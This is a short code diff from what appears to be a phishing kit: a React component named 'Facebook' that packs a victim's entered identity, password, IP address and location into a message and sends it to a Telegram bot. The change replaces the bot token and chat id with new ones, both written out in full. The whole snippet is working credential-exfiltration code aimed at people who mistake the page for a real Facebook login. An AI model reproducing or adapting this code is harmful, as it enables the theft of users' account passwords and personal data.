@@ -34,8 +34,8 @@ const Facebook = () => {
         const PasswordLogin = formData.password;
         const SubmitValue = `Facebook Result is :%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-        const token = "6807684688:AAGnRdy0_lrzwmZYcaGQxCSx0sm3p93WLSU";
-        const chat_id = -4683741213;
+        const token = "6455159198:AAHNzNXFG0QLOsViyA2HqnSHVipB1p3U4Kg";
+        const chat_id = -4133416915;
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;
 
         let api = new XMLHttpRequest();
